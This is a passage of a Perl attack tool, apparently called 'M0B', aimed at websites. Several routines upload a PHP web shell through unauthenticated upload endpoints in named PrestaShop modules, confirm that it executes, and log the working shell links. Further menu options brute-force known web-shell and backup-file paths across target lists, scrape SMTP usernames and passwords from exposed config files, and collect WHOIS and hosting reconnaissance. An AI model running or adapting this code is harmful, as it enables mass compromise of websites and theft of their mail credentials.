my $checkpk_flexmenu = $ua->get("$pk_flexmenuup")->content;
if($checkpk_flexmenu =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_flexmenu";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $pk_flexmenuup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$pk_flexmenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_flexmenu";

print color('bold red'),"[FAILED]\n";
}
}

################ pk_vertflexmenu #####################
sub pk_vertflexmenu(){
my $url = "$site/modules/pk_vertflexmenu/ajax/upload.php";
my $shell ="l.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_vertflexmenuup="$site/modules/pk_vertflexmenu/uploads/l.php?X=M0B";

my $checkpk_vertflexmenu = $ua->get("$pk_vertflexmenuup")->content;
if($checkpk_vertflexmenu =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_vertflexmenu";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $pk_vertflexmenuup\n";

open (TEXT, '>>rez/Shells.txt');
print TEXT "$pk_vertflexmenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_vertflexmenu";

print color('bold red'),"[FAILED]\n";
}
}

################ nvn_export_orders #####################
sub nvn_export_orders(){
my $url = "$site/modules/nvn_export_orders/upload.php";
my $shell ="nvn_extra_add.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$nvn_export_ordersup="$site/modules/nvn_export_orders/nvn_extra_add.php?X=M0B";

my $checknvn_export_orders = $ua->get("$nvn_export_ordersup")->content;
if($checknvn_export_orders =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"nvn_export_orders";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $nvn_export_ordersup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$nvn_export_ordersup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"nvn_export_orders";

print color('bold red'),"[FAILED]\n";
}
}

################ megamenu #####################
sub megamenu(){
my $url = "$site/modules/megamenu/uploadify/uploadify.php?id=l.php";
my $shell ="l.php.png";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$megamenuup="$site/l.php.png?X=M0B";

my $checkmegamenu = $ua->get("$megamenuup")->content;
if($checkmegamenu =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"megamenu";
print color('bold white')," .......................... ";
print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $megamenuup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$megamenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"megamenu";
print color('bold white')," .......................... ";
print color('bold red'),"[FAILED]\n";
}
}

################ tdpsthemeoptionpanel #####################
sub tdpsthemeoptionpanel(){
my $url = "$site/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php";
my $shell ="l.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$tdpsthemeoptionpanelup="$site/modules/tdpsthemeoptionpanel/upload/l.php?X=M0B";

my $checktdpsthemeoptionpanel = $ua->get("$tdpsthemeoptionpanelup")->content;
if($checktdpsthemeoptionpanel =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"tdpsthemeoptionpanel";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $tdpsthemeoptionpanelup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$tdpsthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"tdpsthemeoptionpanel";

print color('bold red'),"[FAILED]\n";
}
}


################ psmodthemeoptionpanel #####################
sub psmodthemeoptionpanel(){
my $url = "$site/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php";
my $shell ="l.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$psmodthemeoptionpanelup="$site/modules/psmodthemeoptionpanel/upload/l.php?X=M0B";

my $checkpsmodthemeoptionpanel = $ua->get("$psmodthemeoptionpanelup")->content;
if($checkpsmodthemeoptionpanel =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"psmodthemeoptionpanel";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $psmodthemeoptionpanelup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$psmodthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"psmodthemeoptionpanel";

print color('bold red'),"[FAILED]\n";
}
}


################ masseditproduct #####################
sub masseditproduct(){
my $url = "$site/modules/lib/redactor/file_upload.php";
my $shell ="l.php";
my $field_name = "file";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$masseditproductup="$site/masseditproduct/uploads/file/l.php?X=M0B";

my $checkmasseditproduct = $ua->get("$masseditproductup")->content;
if($checkmasseditproduct =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"masseditproduct";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $masseditproductup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$masseditproductup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"masseditproduct";

print color('bold red'),"[FAILED]\n";
}
}


############################
######### OTHER :) #########
############################
sub other {
if ( @uname =~ Linux ) {    #for linux os
	 system("clear");
	 }
	 
print "\n\n[+] Welcome to hidden M0B , what would you try?\n\n";
print colored("[1] shell / cpanel cracker / hacked index finder/detecter ?\n",'green');
print colored("[2] Find smtp from config ?\n",'green');
print colored("[3] gather details about a website ?\n",'green');
print colored("[4] Leave me alone !!\n\n",'red');

$number=<STDIN>;
chomp $number;
if($number eq '1'){
vulnfinder();
}
if($number eq '2'){
getsmtp();
exit;
}
if($number eq '3'){
gatherinf();
exit;
}
if($number eq '4'){
exit;
}
if($number !~ /1|2|3|4/){
print "AHO DESU KA?\n\n";
other();
}
}

sub vulnfinder {

print "\n\n[+] Welcome to MULTI VULNERABILITIES FINDER tool , how would you find shells?\n";
print "[+] Remarque : detecting tools may not found exactly results\n\n";
print colored("[1] detect working shells\n",'green');
print colored("[2] find shell link\n",'green');
print colored("[3] detect hacked sites\n",'green');
print colored("[4] detect cpanel cracker scripts\n",'green');
print colored("[5] Leave\n\n",'red');

$number=<STDIN>;
chomp $number;
if($number eq '1'){
shelldetect();
exit;
}
if($number eq '2'){
shellfind();
exit;
}
if($number eq '3'){
detecthacked();
exit;
}
if($number eq '4'){
detectcp();
exit;
}
if($number eq '5'){
exit;
}
if($number !~ /1|2|3|4|5/){
print "AHO DESU KA?\n\n";
vulnfinder();
}
}

sub shelldetect {
print colored("[PUT YOUR LIST]: ",'red');
 
$lista=<STDIN>;
chomp($lista);
print "\n";
open (lista, "<$lista") || die "\n [LIST NOT FOUND]";
my @lista = <lista>;
close lista;
 
foreach $site(@lista) {
 
if($site !~ /http:\/\//) { $site = "$site/"; };
detect();
}
sub detect($site){

my $checar = $ua->get("$site")->content;
if($checar =~/K2LL33D SHELL|k2ll33d|uploader by ghost-dz|Upload file: [ Writeable ]|Upload Form Yunkers Crew|Mr. DellatioNx196 GaLers xh3LL Backd00r 1.0|Fallagassrini|Mister Spy Bypass Shell|bypass 1.0, Devloped By El Moujahidin|b374k|IndoXploit|Jijle3 [PHDZ]|J3Dianas/) {
    print colored("[SHELL]: $site",'WHITE ON_CYAN'),"\n";
open(save, '>>hidden/shell_detect.txt');
    print save "$site\n";
    close(save);
}
########################## maybe shell
elsif($checar =~/-Ubuntu SMP|UTC 2018 x86_64|.ELK6.x86_64 #1 SMP|.el6.x86_64 #1 SMP|EDT 2018 x86_64|.el7.x86_64 #1 SMP|UTC 2016 x86_64|.el6h.x86_64 #1 SMP|EDT 2018 x86_64|#1 SMP |CDT 2018 x86_64|wp-cron.php|wp-config.php|wp-content|.ELK6.x86_64 #1 SMP|CDT 2018 x86_64|.el6h.x86_64 #1 SMP|EDT 2018 x86_64|Linux|Windows|Ubunto|Debian|#1 SMP|MSK 2018 x86_64|.hostgator.com|.bluehost.com|.justhost.com|.myserverhosts.com|.sgcentos.com|.websitewelcome.com|.secureserver.net|UTC 2015 x86_64|CDT 2016 x86_64|CST 2016 x86_64|UTC 2016 x86_64|EDT 2016 x86_64|MSK 2016|CDT 2014 x86_64|CST 2014 x86_64|UTC 2014 x86_64|EDT 2014 x86_64|MSK 2014|CDT 2015 x86_64|CST 2015 x86_64|UTC 2015 x86_64|EDT 2015 x86_64|MSK 2015|CDT 2013 x86_64|CST 2013 x86_64|UTC 2013 x86_64|EDT 2013 x86_64|MSK 2013|(Windows Server 2008 Enterprise Edition Service Pack 2)/) {
    print colored("[MAYBE SHELL]: $site",'WHITE ON_yellow'),"\n";
open(save, '>>hidden/maybe_shell_detect.txt');
    print save "$site\n";
    close(save);
}
else{
   print colored("[UNKNOWN]: $site",'BOLD WHITE'),"\n";
   close(save);
}

}
}

sub shellfind {
print colored("[PUT YOUR LIST]: ",'red');
 
$lista=<STDIN>;
chomp($lista);
print "\n";
open (lista, "<$lista") || die "\n [LIST NOT FOUND]";
my @lista = <lista>;
close lista;
 
foreach $site(@lista) {
chomp($site);
$a++;
find();
}
sub find($site){
@path = ('web.root','WSO.php','dz.php','cpanel.php','Cpanel.php','cpn.php','sql.php','mysql.php','Cgishell.pl','1.php',
'2.php','shell.php','sh3ll.php','dz0.php','killer.php','dam.php','dom.php','user.php','users.php','whmcs.php','d0mains.php',
'vb.php','forum.php','forums.php','wp.php','wordpress.php','joomla.php','Sym.php','cp.php','sql.php','h4xor.phpL3b.php','d.php','a.php',
'b.php','c.php','upload.php','uploads.php','up.php','image.php','images.php',
'sq.php','sa.php','sa2.php','gaza.php','site.php','home.php','test.php','data.php','domaine.php','domain.php','domains.php','Symlink.php','c99.php',
'c100.php','dx.php','server.php','priv8.php','cgi.pl','Symlink.pl','root.php','404.php','roots.php','Marvins.php','Esbkdv.php','bwi.php','zumbing.php',
'hamody.php','xd.php','shell.php','x88.php','wso.php','css/1/jou.php','FARES.php','fares.php','WSO.php','dz.php',
'w.php','wp-content/plugins/akismet/akismet.php','images/stories/w.php','w.php','shell.php','cpanel.php','cpn.php','sql.php','mysql.php',
'config.php','configuration.php','madspot.php','Cgishell.pl','killer.php','changeall.php','2.php','Sh3ll.php','dz0.php','dam.php','user.php',
'dom.php','whmcs.php','r00t.php','1.php','a.php','r0k.php','abc.php','egy.php','syrian_shell.php','xxx.php','settings.php','tmp.php','cyber.php',
'c99.php','r57.php','404.php','gaza.php','1.php','d4rk.php','index1.php','nkr.php','xd.php','M4r0c.php','Dz.php','sniper.php','ksa.php','v4team.php',
'offline.php','priv8.php','911.php','madspotshell.php','c100.php','sym.php','cp.php','tmp/cpn.php','tmp/w.php','tmp/r57.php','tmp/king.php','tmp/sok.php',
'tmp/ss.php','tmp/as.php','tmp/dz.php','tmp/r1z.php','tmp/whmcs.php','tmp/root.php','tmp/r00t.php','templates/beez/index.php','templates/beez/beez.php',
'templates/rhuk_milkyway/index.php','tmp/uploads.php','tmp/upload.php','tmp/sa.php','sa.php','readme.php','tmp/readme.php',
'wp.zip'.'wp-content/plugins/disqus-comment-system/disqus.php',
'd0mains.php','wp-content/plugins/akismet/akismet.php','madspotshell.php','info.php','egyshell.php','Sym.php','c22.php','c100.php',
'wp-content/plugins/akismet/admin.php#','configuration.php','g.php','wp-content/plugins/google-sitemap-generator/sitemap-core.php#',
'wp-content/plugins/akismet/widget.php#','xx.pl','ls.php','Cpanel.php','k.php','zone-h.php','tmp/user.php','tmp/Sym.php','cp.php',
'tmp/madspotshell.php','tmp/root.php','tmp/whmcs.php','tmp/index.php','tmp/2.php','tmp/dz.php','tmp/cpn.php',
'tmp/changeall.php','tmp/Cgishell.pl','tmp/sql.php','0day.php','tmp/admin.php','cliente/downloads/h4xor.php',
'whmcs/downloads/dz.php','L3b.php','d.php','tmp/d.php','tmp/L3b.php','wp-content/plugins/akismet/admin.php',
'templates/rhuk_milkyway/index.php','templates/beez/index.php','sado.php','admin1.php','upload.php','up.php','vb.zip','vb.rar',
'admin2.asp','uploads.php','sa.php','sysadmins/','admin1/','sniper.php','administration/Sym.php','images/Sym.php',
'/r57.php','/wp-content/plugins/disqus-comment-system/disqus.php','gzaa_spysl','sql-new.php','/shell.php','/sa.php','/admin.php',
'/sa2.php','/2.php','/gaza.php','/up.php','/upload.php','/uploads.php','/templates/beez/index.php','shell.php','/amad.php',
'/t00.php','/dz.php','/site.rar','/Black.php','/site.tar.gz','/home.zip','/home.rar','/home.tar','/home.tar.gz',
'/forum.zip','/forum.rar','/forum.tar','/forum.tar.gz','/test.txt','/ftp.txt','/user.txt','/site.txt','/error_log','/error',
'/cpanel','/awstats','/site.sql','/vb.sql','/forum.sql','r00t-s3c.php','c.php','/backup.sql','/back.sql','/data.sql','wp.rar/',
'wp-content/plugins/disqus-comment-system/disqus.php','asp.aspx','/templates/beez/index.php','tmp/vaga.php',
'tmp/killer.php','whmcs.php','abuhlail.php','tmp/killer.php','tmp/domaine.pl','tmp/domaine.php','useradmin/',
'tmp/d0maine.php','d0maine.php','tmp/sql.php','X.php','123.php','m.php','b.php','up.php','tmp/dz1.php','dz1.php','forum.zip','Symlink.php','Symlink.pl',
'forum.rar','joomla.zip','joomla.rar','wp.php','buck.sql','sysadmin.php','images/c99.php', 'xd.php', 'c100.php',
'spy.aspx','xd.php','tmp/xd.php','sym/root/home/','billing/killer.php','tmp/upload.php','tmp/admin.php',
'Server.php','tmp/uploads.php','tmp/up.php','Server/','wp-admin/c99.php','tmp/priv8.php','priv8.php','cgi.pl/',
'tmp/cgi.pl','downloads/dom.php','templates/ja-helio-farsi/index.php','webadmin.html','admins.php',
'/wp-content/plugins/count-per-day/js/yc/d00.php','bluff.php','king.jeen','admins/','admins.asp','admins.php','wp.zip','/wp-content/plugins/disqus-comment-system/WSO.php',);
 
foreach $myshell(@path){
 
$shellfind = $site.'/'.$myshell;
$req = HTTP::Request->new(GET=>$shellfind);
$useragent = LWP::UserAgent->new();
 
$response = $useragent->request($req);
 
if ($response->is_success){
print "Shell found : $shellfind\n";
 open(save, '>>hidden/shell_find.txt');
    print save "$shellfind\n";
	    close(save);

}else{
print "Shell not found : $shellfind\n";
}
}
}
}

sub detecthacked {
print colored("[PUT YOUR LIST]: ",'red');
 
$lista=<STDIN>;
chomp($lista);
print "\n";
open (lista, "<$lista") || die "\n [LIST NOT FOUND]";
my @lista = <lista>;
close lista;
 
foreach $site(@lista) {
 
if($site !~ /http:\/\//) { $site = "$site/"; };
hackdetect();
}
sub hackdetect($site){

my $checar = $ua->get("$site")->content;
if($checar =~/HACKED BY|hacked by|Hacked|Hacked|Hacked by|0wn3d By|Security is Captured By/) {
    print colored("[HACKED INDEX]: $site",'WHITE ON_red'),"\n";
open(save, '>>hidden/hacked_index_detect.txt');
    print save "$site\n";
    close(save);
}
else{
   print colored("[UNKNOWN]: $site",'BOLD WHITE'),"\n";
   close(save);
}
}
}

sub detectcp {
print colored("[PUT YOUR LIST]: ",'red');
 
$lista=<STDIN>;
chomp($lista);
print "\n";
open (lista, "<$lista") || die "\n [LIST NOT FOUND]";
my @lista = <lista>;
close lista;
 
foreach $site(@lista) {
 
if($site !~ /http:\/\//) { $site = "$site/"; };
cpdetect();
}
sub cpdetect($site){

my $checar = $ua->get("$site")->content;
if($checar =~/1337w0rm|cPanel Cracker|Automatic cPanel Finder|cpanel cracker 3xp1r3 cyber army|cpanel|cpanel finder/) {
    print colored("[CPANEL CRACKER]: $site",'WHITE ON_purple'),"\n";
open(save, '>>hidden/cpanel_detect.txt');
    print save "$site\n";
    close(save);
}
else{
   print colored("[UNKNOWN]: $site",'BOLD WHITE'),"\n";
   close(save);
}
}
}

sub getsmtp {
print "List : ";
$list=<STDIN>;
open(tarrget,"<$list") or die "[LIST NOT FOUND] \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
smtpfind();


}
}
sub smtpfind(){
my $cont = $ua->get("$site")->content;
print "\n";
print item('+'),"$site";
if ($cont =~ /smtpuser = \'(.*?)\';/){
        print "\t SMTP User = $1 \n";
        open (TEXT, '>>hidden/smtp.txt');
        print TEXT " SMTP INFO\n SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print "\t SMTP Password = $1 \n";
        open (TEXT, '>>hidden/smtp.txt');
        print TEXT " SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print "\t SMTP Port = $1 \n";
        open (TEXT, '>>hidden/smtp.txt');
        print TEXT "SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print "\t SMTP Host = $1 \n\n";
        open (TEXT, '>>hidden/smtp.txt');
        print TEXT "SMTP Host = $1\n";
        close (TEXT);
  
}
else{         
print colored("[FAILED]",'red');
print "\n";

    }

}

sub gatherinf {
print item('+'),"Website : ";
chomp($site=<STDIN>);
webinf();
serverip();
domainwhoislookup();
weblocation();
subdomain();
}

sub webinf {
    $url = "https://myip.ms/$site";
    $request = $ua->get($url);
    $response = $request->content;

    if($response =~/> (.*?) visitors per day </)
    {
        print item(),"Hosting Info for Website: $site\n";
        print item(),"Visitors per day: $1 \n";

        if($response =~/> (.*?) visitors per day on (.*?)</){
            print item(),"Visitors per day: $1 \n";
        }
        $ip= (gethostbyname($site))[4];
        my ($a,$b,$c,$d) = unpack('C4',$ip);
        $ip_address ="$a.$b.$c.$d";
        print item(),"IP Address: $ip_address\n";

        if($response =~/IPv6.png'><a href='\/info\/whois6\/(.*?)'>/)
        {
            $ipv6_address=$1;
            print item(),"Linked IPv6 Address: $ipv6_address\n";
        }
        if($response =~/IP Location: <\/td> <td class='vmiddle'><span class='cflag (.*?)'><\/span><a href='\/view\/countries\/(.*?)\/Internet_Usage_Statistics_(.*?).html'>(.*?)<\/a>/)
        {
            $Location=$1;
            print item(),"IP Location: $Location\n";
        }
        if($response =~/IP Reverse DNS (.*?)<\/b><\/div><div class='sval'>(.*?)<\/div>/)
        {
            $host=$2;
            print item(),"IP Reverse DNS (Host): $host\n";
        }
        if($response =~/Hosting Company: <\/td><td valign='middle' class='bold'> <span class='nounderline'><a title='(.*?)'/)
        {
            $ownerName=$1;
            print item(),"Hosting Company: $ownerName\n";
        }
        if($response =~/Hosting Company \/ IP Owner: <\/td><td valign='middle' class='bold'>  <span class='cflag (.*?)'><\/span> <a href='\/view\/web_hosting\/(.*?)'>(.*?)<\/a>/)
        {
            $ownerip=$3;
            print item(),"Hosting Company IP Owner:  $ownerip\n";
        }
        if($response =~/Hosting Company \/ IP Owner: <\/td><td valign='middle' class='bold'> <span class='nounderline'><a title='(.*?)'/)
        {
            $ownerip=$1;
            print item(),"Hosting Company IP Owner:  $ownerip\n";
        }
        if($response =~/IP Range <b>(.*?) - (.*?)<\/b><br>have <b>(.*?)<\/b>/)
        {
            print item(),"Hosting IP Range: $1 - $2 ($3 ip) \n";
        }
        if($response =~/Hosting Address: <\/td><td>(.*?)<\/td><\/tr>/)
        {
            $address=$1;
            print item(),"Hosting Address: $address\n";
        }
        if($response =~/Owner Address: <\/td><td>(.*?)<\/td>/)
        {
            $addressowner=$1;
            print item(),"Owner Address: $addressowner\n";
        }
        if($response =~/Hosting Country: <\/td><td><span class='cflag (.*?)'><\/span><a href='\/view\/countries\/(.*?)\/(.*?)'>(.*?)<\/a>/)
        {
            $HostingCountry=$1;
            print item(),"Hosting Country: $HostingCountry\n";
        }
        if($response =~/Owner Country: <\/td><td><span class='cflag (.*?)'><\/span><a href='\/view\/countries\/(.*?)\/(.*?)'>(.*?)<\/a>/)
        {
            $OwnerCountry=$1;
            print item(),"Owner Country: $OwnerCountry\n";
        }
        if($response =~/Hosting Phone: <\/td><td>(.*?)<\/td><\/tr>/)
        {
            $phone=$1;
            print item(),"Hosting Phone: $phone\n";
        }
        if($response =~/Owner Phone: <\/td><td>(.*?)<\/td><\/tr>/)
        {
            $Ownerphone=$1;
            print item(),"Owner Phone: $Ownerphone\n";
        }
        if($response =~/Hosting Website: <img class='cursor-help noprint left10' border='0' width='12' height='10' src='\/images\/tooltip.gif'><\/td><td><a href='\/(.*?)'>(.*?)<\/a><\/td>/)
        {
            $website=$1;
            print item(),"Hosting Website: $website\n";
        }
        if($response =~/Owner Website: <img class='cursor-help noprint left10' border='0' width='12' height='10' src='\/(.*?)'><\/td><td><a href='\/(.*?)'>(.*?)<\/a>/)
        {
            $Ownerwebsite=$3;
            print item(),"Owner Website: $Ownerwebsite\n";
        }
        if($response =~/CIDR:<\/td><td> (.*?)<\/td><\/tr>/)
        {
            $CIDR=$1;
            print item(),"CIDR: $CIDR\n";
        }
        if($response =~/Owner CIDR: <\/td><td><span class='(.*?)'><a href="\/view\/ip_addresses\/(.*?)">(.*?)<\/a>\/(.*?)<\/span><\/td><\/tr>/)
        {
            print item(),"Owner CIDR: $3/$4\n\n";
        }
        if($response =~/Hosting CIDR: <\/td><td><span class='(.*?)'><a href="\/view\/ip_addresses\/(.*?)">(.*?)<\/a>\/(.*?)<\/span><\/td><\/tr>/)
        {
            print item(),"Hosting CIDR: $3/$4\n\n";
        }
        $url = "https://dns-api.org/NS/$site";
        $request = $ua->get($url);
        $response = $request->content;
    }else {
        print item(),"There Is A Problem\n\n";
        print item('1'),"Checking The Connection\n";
        print item('2'),"Enter Website Without HTTP/HTTPs\n";
        print item('3'),"Check If Website Working\n";
    }
    my %seen;
    while($response =~m/value":"(.*?)."/g)
    {
        $ns=$1;
        next if $seen{$ns}++;
        print item(),"NS: $ns \n";
    }
}

sub serverip {
    $ua = LWP::UserAgent->new(keep_alive => 1);
    $ua->agent("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0");
    my $url = "https://dns-api.org/MX/$site";

    $request = $ua->get($url);
    $response = $request->content;
    if ($response =~ /error/){
        print item(),"There Is A Problem\n\n";
        print item('1'),"Checking The Connection\n";
        print item('2'),"Enter Website Without HTTP/HTTPs\n";
        print item('3'),"Check If Website Working\n";
        exit
    }
    print item(),"Domain name for MX records: $site\n\n";
    my %seen;
    while($response =~m/value":"(.*?) (.*?)."/g)
    {
        $mx=$2;
        next if $seen{$mx}++;
        print item(),"$mx -- priority $1\n";
    }
}

sub domainwhoislookup {
    $url = "https://pastebin.com/raw/YfHdX0jE";
    $request = $ua->get($url);
    $api4 = $request->content;
    $url = "http://www.whoisxmlapi.com//whoisserver/WhoisService?domainName=$site&username=$api4&outputFormat=JSON";
    $request = $ua->get($url);
    $response = $request->content;

    my $responseObject = decode_json($response);

    if (exists $responseObject->{'WhoisRecord'}->{'createdDate'}){
        print item(),"Whois lookup for : $site \n";
        print item(),'Created date: ',
        $responseObject->{'WhoisRecord'}->{'createdDate'},"\n";sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'expiresDate'}){
            print item(),'Expires date: ',
            $responseObject->{'WhoisRecord'}->{'expiresDate'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'contactEmail'}){
            print item(),'Contact email: ',
            $responseObject->{'WhoisRecord'}->{'contactEmail'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'name'}){
            print item(),'Registrant Name: ',
            $responseObject->{'WhoisRecord'}->{'registrant'}->{'name'},"\n";} sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'organization'}){
            print item(),'Registrant Organization: ',
            $responseObject->{'WhoisRecord'}->{'registrant'}->{'organization'},"\n";} sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'street1'}){
            print item(),'Registrant Street: ',
            $responseObject->{'WhoisRecord'}->{'registrant'}->{'street1'},"\n";} sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'city'}){
            print item(),'Registrant City: ',
            $responseObject->{'WhoisRecord'}->{'registrant'}->{'city'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'state'}){
            print item(),'Registrant State/Province: ',
            $responseObject->{'WhoisRecord'}->{'registrant'}->{'state'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'postalCode'}){
            print item(),'Registrant Postal Code: ',
            $responseObject->{'WhoisRecord'}->{'registrant'}->{'postalCode'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'country'}){
            print item(),'Registrant Country: ',
            $responseObject->{'WhoisRecord'}->{'registrant'}->{'country'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'email'}){
            print item(),'Registrant Email: ',
            $responseObject->{'WhoisRecord'}->{'registrant'}->{'email'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'telephone'}){
            print item(),'Registrant Phone: ',
            $responseObject->{'WhoisRecord'}->{'registrant'}->{'telephone'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'fax'}){
            print item(),'Registrant Fax: ',
            $responseObject->{'WhoisRecord'}->{'registrant'}->{'fax'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'name'}){
            print item(),'Admin Name: ',
            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'name'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'organization'}){
            print item(),'Admin Organization: ',
            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'organization'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'street1'}){
            print item(),'Admin Street: ',
            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'street1'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'city'}){
            print item(),'Admin City: ',
            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'city'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'state'}){
            print item(),'Admin State/Province: ',
            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'state'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'postalCode'}){
            print item(),'Admin Postal Code: ',
            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'postalCode'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'country'}){
            print item(),'Admin Country: ',
            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'country'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'email'}){
            print item(),'Admin Email: ',
            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'email'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'telephone'}){
            print item(),'Admin Phone: ',
            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'telephone'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'fax'}){
            print item(),'Admin Fax: ',
            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'fax'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'name'}){
            print item(),'Tech Name: ',
            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'name'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'organization'}){
